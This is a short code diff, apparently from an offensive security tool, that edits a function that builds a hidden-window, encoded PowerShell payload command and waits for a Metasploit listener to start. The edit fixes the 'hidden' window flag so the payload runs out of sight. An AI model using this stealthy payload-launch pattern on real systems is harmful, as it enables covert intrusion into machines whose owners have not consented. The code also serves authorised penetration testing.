@@ -183,7 +183,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
 
         x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
-        x86 = "powershell -nop -win hid -noni -enc " + x86
+        x86 = "powershell -nop -win hidden -noni -enc " + x86
         print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
         filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
@@ -206,6 +206,8 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 print_status("Waiting for the listener to start first before we continue forward...")
                 print_status("Be patient, Metaploit takes a little bit to start...")
                 child2.expect("Starting the payload handler", timeout=30000)
+                print_status("Metasploit started... Waiting a couple more seconds for listener to activate..")
+                time.sleep(5)
 
         # assign random_exe command to the powershell command
         random_exe = powershell_command
